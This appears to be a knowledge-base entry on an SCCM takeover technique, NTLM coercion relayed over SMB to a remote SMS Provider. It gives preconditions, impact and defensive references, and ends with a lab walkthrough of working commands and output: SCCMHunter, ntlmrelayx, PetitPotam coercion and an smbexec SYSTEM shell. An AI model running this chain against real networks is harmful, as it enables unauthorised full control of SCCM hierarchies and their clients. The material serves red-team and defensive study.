# TAKEOVER-6

## Description
Hierarchy takeover via NTLM coercion and relay to SMB on remote SMS Provider


## MITRE ATT&CK TTPs
- [TA0008](https://attack.mitre.org/tactics/TA0008) - Lateral Movement
- [TA0004](https://attack.mitre.org/tactics/TA0004) - Privilege Escalation

## Requirements

### Coercion
- Valid Active Directory domain credentials
- Connectivity to SMB (TCP/445) on a coercion target:
    - TAKEOVER-6.1: Coerce primary site server
    - TAKEOVER-6.2: Coerce passive site server
- Connectivity from the coercion target to SMB (TCP/445) on the relay server
- Coercion target settings:
    - `BlockNTLM` = `0` or not present, or = `1` and `BlockNTLMServerExceptionList` contains attacker relay server [DEFAULT]
    - `RestrictSendingNTLMTraffic` = `0`, `1`, or not present, or = `2` and `ClientAllowedNTLMServers` contains attacker relay server [DEFAULT]
- Domain controller settings:
    - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains coercion target [DEFAULT]

### Relay
- Connectivity from the relay server to SMB (TCP/445) on the relay target
- Relay target settings:
    - `RequireSecuritySignature` = `0` or not present [DEFAULT]
    - `RestrictReceivingNTLMTraffic` = `0` or not present [DEFAULT]
    - Coercion target is local admin (to access RPC/admin shares)
- Domain controller settings:
    - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains relay target [DEFAULT]
    - `LmCompatibilityLevel` < `5` or not present, or = `5` and LmCompatibilityLevel >= `3` on the coercion target [DEFAULT]

## Summary
The SMS Provider is a SCCM site server role installed by default on the site server when configuring a primary site or central administration site. The role can optionally be installed on additional SCCM site systems for high availability configurations. The SMS Provider is a Windows Management Instrumentation (WMI) provider that performs as an intermediary for accessing and modifying data stored in the site database. An attacker who is able to successfully coerce NTLM authentication from a site server can escalate to "Full Administrator" by elevating to "NT\AUTHORITY SYSTEM" on the SMS Provider.

## Impact
This technique may allow an attacker to relay a site server domain computer account to a remote SMS Provider and elevate their privileges to "Full Administrator" for the SCCM Hierarchy. If successful, this technique enables an attacker to execute arbitrary programs on any client device that is online as SYSTEM, the currently logged on user, or as a specific user when they next log on.

## Defensive IDs
- [DETECT-1: Monitor site server domain computer accounts authenticating from another source](../../../defense-techniques/DETECT/DETECT-1/detect-1_description.md)
- [DETECT-5: Monitor group membership changes for SMS Admins](../../../defense-techniques/DETECT/DETECT-5/detect-5_description.md)
- [DETECT-6: Monitor group membership changes for RBAC_Admins table](../../../defense-techniques/DETECT/DETECT-6/detect-6_description.md)
- [PREVENT-12: Require SMB signing on site systems](../../../defense-techniques/PREVENT/PREVENT-12/prevent-12_description.md)
- [PREVENT-20: Block unnecessary connections to site systems](../../../defense-techniques/PREVENT/PREVENT-20/prevent-20_description.md)

## Examples
1. Use `SCCMHunter` to  profile SCCM infrastructure:

    ```
    [02:00:25 PM] INFO     [+] Finished profiling all discovered computers.                                   
    [02:00:25 PM] INFO     +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
                        | Hostname                | SiteCode   | SigningStatus   | SiteServer   | ManagementPoint   | DistributionPoint   | SMSProvider   | WSUS   | MSSQL   |
                        +=========================+============+=================+==============+===================+=====================+===============+========+=========+
                        | provider.internal.lab   | None       | False           | False        | False             | False               | True          | False  | False   |
                        +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
                        | sccm.internal.lab       | LAB        | False           | True         | True              | False               | True          | False  | False   |
                        +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+       
    ```
2. On the attacker relay server, start `ntlmrelayx`, targeting the SMB service remote SMS Provider identified in the previous step:
    ```
    └─# ntlmrelayx.py -t smb://10.10.100.12 -socks -smb2support
    Impacket v0.12.0.dev1+20240130.154745.97007e84 - Copyright 2023 Fortra

    [*] Protocol Client SMB loaded..
    [*] Protocol Client IMAPS loaded..
    [*] Protocol Client IMAP loaded..
    [*] Protocol Client RPC loaded..
    [*] Protocol Client DCSYNC loaded..
    [*] Protocol Client MSSQL loaded..
    [*] Protocol Client LDAP loaded..
    [*] Protocol Client LDAPS loaded..
    [*] Protocol Client SMTP loaded..
    [*] Protocol Client HTTPS loaded..
    [*] Protocol Client HTTP loaded..
    [*] Running in relay mode to single host
    [*] SOCKS proxy started. Listening on 127.0.0.1:1080
    [*] HTTPS Socks Plugin loaded..
    [*] HTTP Socks Plugin loaded..
    [*] MSSQL Socks Plugin loaded..
    [*] SMTP Socks Plugin loaded..
    [*] SMB Socks Plugin loaded..
    [*] IMAPS Socks Plugin loaded..
    [*] IMAP Socks Plugin loaded..
    [*] Setting up SMB Server
    [*] Setting up HTTP Server on port 80
    * Serving Flask app 'impacket.examples.ntlmrelayx.servers.socksserver'
    * Debug mode: off
    [*] Setting up WCF Server
    [*] Setting up RAW Server on port 6666
    ```

3. From the attacker host, coerce NTLM authentication from the site server targeting the relay server's IP address:
    ```
    ┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/PetitPotam]
    └─# python3 PetitPotam.py -u lowpriv -p P@ssw0rd <NTLMRELAYX_LISTENER_IP> <SITE_SERVER_IP> 

    Trying pipe lsarpc
    [-] Connecting to ncacn_np:passive.internal.lab[\PIPE\lsarpc]
    [+] Connected!
    [+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
    [+] Successfully bound!
    [-] Sending EfsRpcOpenFileRaw!
    [-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
    [+] OK! Using unpatched function!
    [-] Sending EfsRpcEncryptFileSrv!
    [+] Got expected ERROR_BAD_NETPATH exception!!
    [+] Attack worked!
    ```

    After a few seconds, you should receive an SMB connection on the relay server that is forwarded to the SMB service on the SMS provider and the authenticated session is held open

    ```
    [*] Servers started, waiting for connections
    Type help for list of commands
    ntlmrelayx> [*] SMBD-Thread-9 (process_request_thread): Received connection from 10.10.100.9, attacking target smb://10.10.100.12
    [*] Authenticating against smb://10.10.100.12 as LAB/SCCM$ SUCCEED
    [*] SOCKS: Adding LAB/SCCM$@10.10.100.12(445) to active SOCKS connection. Enjoy
    [*] SMBD-Thread-10 (process_request_thread): Connection from 10.10.100.9 controlled, but there are no more targets left!
    [*] SOCKS: Proxying client session for LAB/SCCM$@10.10.100.12(445)
    socks
    Protocol  Target        Username   AdminStatus  Port
    --------  ------------  ---------  -----------  ----
    SMB       10.10.100.12  LAB/SCCM$  TRUE         445
    ntlmrelayx>
    ```

 4. Proxy `smbexec.py` in the context of the site server through the authenticated session to establish interactive access on the target host as NT\AUTHORITY SYSTEM:
    ```
    └─# proxychains smbexec.py LAB/SCCM\$@10.10.100.12 -codec 437 -no-pass
    [proxychains] config file found: /etc/proxychains4.conf
    [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
    [proxychains] DLL init: proxychains-ng 4.16
    Impacket v0.12.0.dev1+20240130.154745.97007e84 - Copyright 2023 Fortra
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.100.12:445  ...  OK
    [!] Launching semi-interactive shell - Careful what you execute
    C:\Windows\system32>wmic /namespace:\\root\sms\site_lab path SMS_Admin get AdminID,LogonName
     ■AdminID   LogonName
    16777217  LAB\Administrator
    16777220  LAB\lowpriv

    C:\Windows\system32>
    ```

## References
- Garrett Foster, [SCCMHunter](https://github.com/garrettfoster13/sccmhunter)
- Garrett Foster, [Site Takeover via SCCM's AdminService API](https://posts.specterops.io/site-takeover-via-sccms-adminservice-api-d932e22b2bf)
- Microsoft, [Plan for the SMS Provider](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/plan-for-the-sms-provider)
